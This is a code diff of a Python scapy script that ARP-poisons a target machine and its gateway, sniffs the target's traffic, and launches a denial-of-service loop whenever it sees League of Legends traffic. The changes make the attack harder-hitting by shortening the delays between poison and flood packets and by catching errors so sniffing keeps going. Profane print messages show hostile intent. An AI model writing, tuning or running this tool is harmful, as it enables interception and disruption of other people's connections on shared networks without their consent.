@@ -4,13 +4,19 @@ import scapy.all as scapy
 
 def LeagueCanceller(pkt, targets, interface, MACs):
     print(pkt.summary())
-    print(f'The destination ip is {pkt[scapy.IP].dst}')
-    print(f'The source ip is {pkt[scapy.IP].src}')
-    if(isLeagueIP(pkt[scapy.IP].dst) or isLeagueIP(pkt[scapy.IP].src)):
-        while 1:
-            print("FUCK YOU DWEEB")
-            print(f'the targets are {targets} and the interface is {interface}')
-            DDoSButBased(targets, interface, MACs)
+    # print(f'The destination ip is {pkt[scapy.IP].dst}')
+    # print(f'The source ip is {pkt[scapy.IP].src}')
+    try:
+        if(isLeagueIP(pkt[scapy.IP].dst) or isLeagueIP(pkt[scapy.IP].src)):
+            while 1:
+                print("FUCK YOU DWEEB")
+                print(f'the targets are {targets} and the interface is {interface}')
+                DDoSButBased(targets, interface, MACs)
+    except Exception:
+        # Non-TCP packet detected. Don't worry about it.
+        return
+
+
 
 class PreAttack(object):
     def __init__(self, targ, iface):
@@ -77,13 +83,14 @@ def Rosie(interface, gWayT, target, fwd):
        try:
            try:
                Attack(targets, interface).KuzcosPoison(MACs)
-               scapy.sniff(count=5, prn=lambda x:LeagueCanceller(x, targets, interface, MACs), filter=f'host {targets[1]}')
+               scapy.sniff(count=10, prn=lambda x:LeagueCanceller(x, targets, interface, MACs), filter=f'host {targets[1]}')
                #sniff(prn=lambda x:x.summary(), count=1)
-           except Exception:
+           except Exception as e:
                print('Failed to poison')
+               print(str(e))
                sys.exit(1)
            print('poison sent to %s and %s' %(targets[0], targets[1]))
-           time.sleep(2.5)
+           time.sleep(0.25)
        except KeyboardInterrupt:
            break
     #fix the ARP tables
@@ -105,7 +112,7 @@ def DDoSButBased(targets, interface, MACs):
         except(Exception, KeyboardInterrupt):
             print('[FUCK]')
             sys.exit(1)
-        time.sleep(2)
+        time.sleep(0.25)
     print('[POGGED]')
 
 def isLeagueIP(ipAddr):
